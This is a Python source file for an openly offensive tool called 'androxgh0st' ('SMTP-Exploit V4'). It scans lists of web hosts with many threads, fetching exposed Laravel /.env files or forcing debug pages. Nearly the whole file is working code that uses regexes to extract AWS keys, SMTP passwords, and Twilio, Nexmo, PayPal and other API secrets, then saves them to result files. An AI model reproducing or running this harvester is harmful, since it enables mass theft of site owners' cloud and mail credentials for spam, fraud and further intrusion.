# -*- coding: utf-8 -*-
import requests, os, sys, colorama
from re import findall as reg
requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread
from ConfigParser import ConfigParser
from Queue import Queue

colorama.init()

try:
	os.mkdir('Results')
except:
	pass

list_region = '''us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1'''
pid_restore = '.nero_swallowtail'

class Worker(Thread):
	def __init__(self, tasks):
		Thread.__init__(self)
		self.tasks = tasks
		self.daemon = True
		self.start()

	def run(self):
		while True:
			func, args, kargs = self.tasks.get()
			try: func(*args, **kargs)
			except Exception, e: print e
			self.tasks.task_done()

class ThreadPool:
	def __init__(self, num_threads):
		self.tasks = Queue(num_threads)
		for _ in range(num_threads): Worker(self.tasks)

	def add_task(self, func, *args, **kargs):
		self.tasks.put((func, args, kargs))

	def wait_completion(self):
		self.tasks.join()

class androxgh0st:
	def paypal(self, text, url):
		if "PAYPAL_" in text:
			save = open('Results/paypal_sandbox.txt','a')
			save.write(url+'\n')
			save.close()
			return True
		else:
			return False

	def get_aws_region(self, text):
		reg = False
		for region in list_region.splitlines():
			if str(region) in text:
				return region
				break

	def get_aws_data(self, text, url):
		try:
			if "AWS_ACCESS_KEY_ID" in text:
				if "AWS_ACCESS_KEY_ID=" in text:
					method = '/.env'
					try:
						aws_key = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+'|'+str(aws_sec)+'|'+str(aws_reg)
					remover = str(build).replace('\r', '')
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					remover = str(build).replace('\r', '')
					save2 = open('Results/aws_access_key_secret.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
				return True
			elif "AWS_KEY" in text:
				if "AWS_KEY=" in text:
					method = '/.env'
					try:
						aws_key = reg("\nAWS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					try:
						aws_buc = reg("\nAWS_BUCKET=(.*?)\n", text)[0]
					except:
						aws_buc = ''
				elif "<td>AWS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					try:
						aws_buc = reg("<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_buc = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+'|'+str(aws_sec)+'|'+str(aws_reg)
					remover = str(build).replace('\r', '')
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n')
					save.close()
					remover = str(build).replace('\r', '')
					save2 = open('Results/aws_access_key_secret.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
				return True
			elif "AWS_SNS_KEY" in text:
				if "AWS_SNS_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_SNS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SNS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						sms_from = reg("\nSMS_FROM=(.*?)\n", text)[0]
					except:
						sms_from = ''
					try:
						sms_driver = reg("\nSMS_DRIVER=(.*?)\n", text)[0]
					except:
						sms_deiver = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_SNS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_SNS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SNS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						sms_from = reg("<td>SMS_FROM=<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						sms_from = ''
					try:
						sms_driver = reg("<td>SMS_DRIVER<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						sms_driver = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS SNS KEY: '+str(aws_key)+'\nAWS SNS KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: \nSMS FROM: '+str(sms_from)+'\nSMS DRIVER: '+str(sms_driver)
					remover = str(build).replace('\r', '')
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					remover = str(build).replace('\r', '')
					save2 = open('Results/aws_sns_key_secret.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
				return True
			elif "AWS_S3_KEY" in text:
				if "AWS_S3_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_S3_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_S3_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_S3_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+'|'+str(aws_sec)+'|'+str(aws_reg)
					remover = str(build).replace('\r', '')
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					remover = str(build).replace('\r', '')
					save2 = open('Results/aws_access_key_secret.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
				return True
			elif "AWS_SES_KEY" in text:
				if "AWS_SES_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_SES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+'|'+str(aws_sec)+'|'+str(aws_reg)
					remover = str(build).replace('\r', '')
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					remover = str(build).replace('\r', '')
					save2 = open('Results/aws_access_key_secret.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
				return True
			elif "SES_KEY" in text:
				if "SES_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nSES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nSES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = androxgh0st().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+'|'+str(aws_sec)+'|'+str(aws_reg)
					remover = str(build).replace('\r', '')
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					remover = str(build).replace('\r', '')
					save2 = open('Results/aws_access_key_secret.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
				return True
			else:
				return False
		except:
			return False

	def get_twillio(self, text, url):
		try:
			if "TWILIO" in text:
				if "TWILIO_ACCOUNT_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = reg('\nTWILIO_API_KEY=(.*?)\n', text)[0]
					except:
						acc_key = ''
					try:
						sec = reg('\nTWILIO_API_SECRET=(.*?)\n', text)[0]
					except:
						sec = ''
					try:
						chatid = reg('\nTWILIO_CHAT_SERVICE_SID=(.*?)\n', text)[0]
					except:
						chatid = ''
					try:
						phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
					except:
						phone = ''
					try:
						auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = reg('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_key = ''
					try:
						sec = reg('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						sec = ''
					try:
						chatid = reg('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						chatid = ''
					try:
						phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''
					try:
						auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
				remover = str(build).replace('\r', '')
				save = open('Results/TWILLIO.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			else:
				return False
		except:
			return False

	def get_nexmo(self, text, url):
		try:
			if "NEXMO" in text:
				if "NEXMO_KEY=" in text:
					method = '/.env'
					try:
						nexmo_key = reg('\nNEXMO_KEY=(.*?)\n', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('\nNEXMO_SECRET=(.*?)\n', text)[0]
					except:
						nexmo_secret = ''
					try:
						phone = reg('\nNEXMO_NUMBER=(.*?)\n', text)[0]
					except:
						phone = ''
				elif '<td>NEXMO_KEY</td>' in text:
					method = 'debug'
					try:
						nexmo_key = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nexmo_secret = ''
					try:
						phone = reg('<td>EXMO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''
				build = str(nexmo_key)+'|'+str(nexmo_secret)+'|'+str(phone)
				remover = str(build).replace('\r', '')
				save = open('Results/NEXMO.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			elif "EXOTEL_API_KEY" in text:
				if "EXOTEL_API_KEY=" in text:
					method = '/.env'
					try:
						exotel_api = reg('\nEXOTEL_API_KEY=(.*?)\n', text)[0]
					except:
						exotel_api = ''
					try:
						exotel_token = reg('\nEXOTEL_API_TOKEN=(.*?)\n', text)[0]
					except:
						exotel_token = ''
					try:
						exotel_sid = reg('\nEXOTEL_API_SID=(.*?)\n', text)[0]
					except:
						exotel_sid = ''
				elif '<td>EXOTEL_API_KEY</td>' in text:
					method = 'debug'
					try:
						exotel_api = reg('<td>EXOTEL_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						exotel_api = ''
					try:
						exotel_token = reg('<td>EXOTEL_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						exotel_token = ''
					try:
						exotel_sid = reg('<td>EXOTEL_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						exotel_sid = ''
				build = str(exotel_api)+'|'+str(exotel_token)+'|'+str(exotel_sid)
				remover = str(build).replace('\r', '')
				save = open('Results/EXOTEL.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			elif "ONESIGNAL_APP_ID" in text:
				if "ONESIGNAL_APP_ID=" in text:
					method = '/.env'
					try:
						onesignal_id = reg('\nONESIGNAL_APP_ID=(.*?)\n', text)[0]
					except:
						onesignal_id = ''
					try:
						onesignal_token = reg('\nONESIGNAL_REST_API_KEY=(.*?)\n', text)[0]
					except:
						onesignal_id = ''
					try:
						onesignal_auth = reg('\nONESIGNAL_USER_AUTH_KEY=(.*?)\n', text)[0]
					except:
						onesignal_auth = ''
				elif '<td>ONESIGNAL_APP_ID</td>' in text:
					method = 'debug'
					try:
						onesignal_id = reg('<td>ONESIGNAL_APP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						onesignal_id = ''
					try:
						onesignal_token = reg('<td>ONESIGNAL_REST_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						onesignal_token = ''
					try:
						onesignal_auth = reg('<td>ONESIGNAL_USER_AUTH_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						onesignal_auth = ''
				build = str(onesignal_id)+'|'+str(onesignal_token)+'|'+str(onesignal_auth)
				remover = str(build).replace('\r', '')
				save = open('Results/ONESIGNAL.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			elif "TOKBOX_KEY_DEV" in text:
				if "TOKBOX_KEY_DEV=" in text:
					method = '/.env'
					try:
						tokbox_key = reg('\nTOKBOX_KEY_DEV=(.*?)\n', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('\nTOKBOX_SECRET_DEV=(.*?)\n', text)[0]
					except:
						tokbox_secret = ''
				elif '<td>TOKBOX_KEY_DEV</td>' in text:
					method = 'debug'
					try:
						tokbox_key = reg('<td>TOKBOX_KEY_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('<td>TOKBOX_SECRET_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_secret = ''
				build = str(tokbox_key)+'|'+str(tokbox_secret)
				remover = str(build).replace('\r', '')
				save = open('Results/TOKBOX.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			elif "TOKBOX_KEY" in text:
				if "TOKBOX_KEY=" in text:
					method = '/.env'
					try:
						tokbox_key = reg('\nTOKBOX_KEY=(.*?)\n', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('\nTOKBOX_SECRET=(.*?)\n', text)[0]
					except:
						tokbox_secret = ''
				elif '<td>TOKBOX_KEY</td>' in text:
					method = 'debug'
					try:
						tokbox_key = reg('<td>TOKBOX_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('<td>TOKBOX_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_secret = ''
				build = str(tokbox_key)+'|'+str(tokbox_secret)
				remover = str(build).replace('\r', '')
				save = open('Results/TOKBOX.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			elif "TOKBOX_KEY_OLD" in text:
				if "TOKBOX_KEY_OLD=" in text:
					method = '/.env'
					try:
						tokbox_key = reg('\nTOKBOX_KEY_OLD=(.*?)\n', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('\nTOKBOX_SECRET_OLD=(.*?)\n', text)[0]
					except:
						tokbox_secret = ''
				elif '<td>TOKBOX_KEY_OLD</td>' in text:
					method = 'debug'
					try:
						tokbox_key = reg('<td>TOKBOX_KEY_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('<td>TOKBOX_SECRET_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_secret = ''
				build = str(tokbox_key)+'|'+str(tokbox_secret)
				remover = str(build).replace('\r', '')
				save = open('Results/TOKBOX.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			elif "PLIVO_AUTH_ID" in text:
				if "PLIVO_AUTH_ID=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nPLIVO_AUTH_ID=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nPLIVO_AUTH_TOKEN=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>PLIVO_AUTH_ID</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = str(tokbox_key)+'|'+str(tokbox_secret)
				remover = str(build).replace('\r', '')
				save = open('Results/PVILO.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			else:
				return False
		except:
			return False

	def get_smtp(self, text, url):
		try:
			if "MAIL_HOST" in text:
				if "MAIL_HOST=" in text:
					method = '/.env'
					mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
					mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
					mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
					mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
					try:
						mailfrom = reg("MAIL_FROM_ADDRESS=(.*?)\n", text)[0]
					except:
						mailfrom = ''
					try:
						fromname = reg("MAIL_FROM_NAME=(.*?)\n", text)[0]
					except:
						fromname = ''
				elif "<td>MAIL_HOST</td>" in text:
					method = 'debug'
					mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					try:
						mailfrom = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						mailfrom = ''
					try:
						fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						fromname = ''
				if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
					return False
				else:
					
					if '.amazonaws.com' in mailhost:
						getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
						build = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)+'|'+str(mailpass)
						remover = str(build).replace('\r', '')
						save = open('Results/'+getcountry[:-2]+'.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
						remover = str(build).replace('\r', '')
						save2 = open('Results/smtp_aws.txt', 'a')
						save2.write(remover+'\n\n')
						save2.close()
					elif 'sendgrid' in mailhost:
						build = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)+'|'+str(mailpass)
						remover = str(build).replace('\r', '')
						save = open('Results/sendgrid.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'office365' in mailhost:
						build = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)+'|'+str(mailpass)
						remover = str(build).replace('\r', '')
						save = open('Results/office.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif '1and1' in mailhost or '1und1' in mailhost:
						build = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)+'|'+str(mailpass)
						remover = str(build).replace('\r', '')
						save = open('Results/1and1.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'zoho' in mailhost:
						build = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)+'|'+str(mailpass)
						remover = str(build).replace('\r', '')
						save = open('Results/zoho.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'mandrillapp' in mailhost:
						build = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)+'|'+str(mailpass)
						remover = str(build).replace('\r', '')
						save = open('Results/mandrill.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'mailgun' in mailhost:
						build = +str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)+'|'+str(mailpass)
						remover = str(build).replace('\r', '')
						save = open('Results/mailgun.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					else:
						build = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)+'|'+str(mailpass) 
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP_RANDOM.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					return True
			else:
				return False
		except:
			return False

def printf(text):
	''.join([str(item) for item in text])
	print(text + '\n'),

def main(url):
	resp = False
	try:
		text = '\x1b[42;1m[Connect To List]\x1b[0m  '+url
		headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
		get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text
		if "APP_KEY=" in get_source:
			resp = get_source
		else:
			get_source = requests.post(url, data={1: 1}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
			if "<td>APP_KEY</td>" in get_source:
				resp = get_source
		if resp:
			getsmtp = androxgh0st().get_smtp(resp, url)
			getwtilio = androxgh0st().get_twillio(resp, url)
			smsapi = androxgh0st().get_nexmo(resp, url)
			getaws = androxgh0st().get_aws_data(resp, url)
			getpp = androxgh0st().paypal(resp, url)
			if getsmtp:
				text += ' \x1b[42;1m[Status]\x1b[0m \x1b[46;1mSMTP\x1b[0m'
			else:
				text += ' \x1b[42;1m[Status]\x1b[0m \x1b[45;1mSMTP\x1b[0m'
			if getaws:
				text += ' \x1b[42;1m[Status]\x1b[0m \x1b[44;1mAWS\x1b[0m'
			else:
				text += ' \x1b[42;1m[Status]\x1b[0m \x1b[43;1mAWS\x1b[0m'
			if getwtilio:
				text += ' \x1b[42;1m[Status]\x1b[0m \x1b[42;1mTWILIO\x1b[0m'
			else:
				text += ' \x1b[42;1m[Status]\x1b[0m \x1b[43;1mTWILIO\x1b[0m'
			if smsapi:
				text += ' \x1b[42;1m[Status]\x1b[0m \x1b[46;1mSMS API\x1b[0m'
			else:
				text += ' \x1b[42;1m[Status]\x1b[0m \x1b[45;1mSMS API\x1b[0m'
			if getpp:
				text += ' \x1b[42;1m[Status]\x1b[0m \x1b[44;1mPAYPAL\x1b[0m'
			else:
				text += ' \x1b[42;1m[Status]\x1b[0m \x1b[45;1mPAYPAL\x1b[0m'
		else:
			text = ' \x1b[42;1m[Status]\x1b[0m \x1b[41;1mFail To Crack\x1b[0m'
			save = open('Results/not_vulnerable.txt','a')
			asu = str(url).replace('\r', '')
			save.write(asu+'\n')
			save.close()
	except:
		text = '\x1b[42;1m[Connect To List]\x1b[0m  '+url
		text += ' \x1b[42;1m[Status]\x1b[0m \x1b[41;1mBad List\x1b[0m'
		save = open('Results/not_vulnerable.txt','a')
		asu = str(url).replace('\r', '')
		save.write(asu+'\n')
		save.close()
	printf(text)


if __name__ == '__main__':
	print('\n\n                          \x1b[46;1m SMTP-Exploit V4 (Final Version)\x1b[0m\n\t\t  _________        __        ___________       \n\t\t /   _____/ ______/  |_______\\_   _____/__  ___\n\t\t \\_____  \\ /     \\   __\\____ \\|    __)_\\  \\/  /\n\t\t /        \\  Y Y  \\  | |  |_> >        \\>    < \n\t\t/_______  /__|_|  /__| |   __/_______  /__/\\_ \\\n\t\t        \\/      \\/     |__|          \\/      \\/\n                          \x1b[33mReversed By Scarletta\'s Lounge\x1b[0m - \x1b[41;1mFixed By Anti7root\x1b[0m\n\n\n\t [\x1b[36;1m+\x1b[0m]\x1b[36;1m SmtpAws-Exploit\x1b[0m\n\t [\x1b[36;1m+\x1b[0m]\x1b[36;1m RCE V9 (Perfect Verion) \x1b[0m\n\t [\x1b[36;1m+\x1b[0m]\x1b[36;1m 120 Top Exploit + Pages \x1b[0m\n\t [\x1b[36;1m+\x1b[0m]\x1b[36;1m Private 2022 SMTP-AWS Cracker \x1b[0m\t\n\n\t \n')
	try:
		readcfg = ConfigParser()
		readcfg.read(pid_restore)
		lists = readcfg.get('DB', 'FILES')
		numthread = readcfg.get('DB', 'THREAD')
		sessi = readcfg.get('DB', 'SESSION')
		print("log session bot found! restore session")
		print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
		tanya = raw_input("Want to contineu session ? [Y/n] ")
		if "Y" in tanya or "y" in tanya:
			lerr = open(lists).read().split("\n"+sessi)[1]
			readsplit = lerr.splitlines()
		else:
			kntl 
	except:
		try:
			lists = sys.argv[1]
			numthread = sys.argv[2]
			readsplit = open(lists).read().splitlines()
		except:
			try:
				lists = raw_input('List IPs/Domain \x1b[36;1m--> \x1b[0m')
				readsplit = open(lists).read().splitlines()
			except:
				print("List Not Found")
				exit()
			try:
				numthread = raw_input('Thread (Default : \x1b[36;1m200\x1b[0m) \x1b[36;1m--> \x1b[0m ')
			except:
				print("Wrong Thread Number!")
				exit()
	pool = ThreadPool(int(numthread))
	for url in readsplit:
		if "://" in url:
			url = url
		else:
			url = "http://"+url
		if url.endswith('/'):
			url = url[:-1]
		jagases = url
		try:
			pool.add_task(main, url)
		except KeyboardInterrupt:
			session = open(pid_restore, 'w')
			cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
			session.write(cfgsession)
			session.close()
			print("CTRL+C Detect, Session saved")
			exit()
	pool.wait_completion()
	try:
		os.remove(pid_restore)
	except:
		pass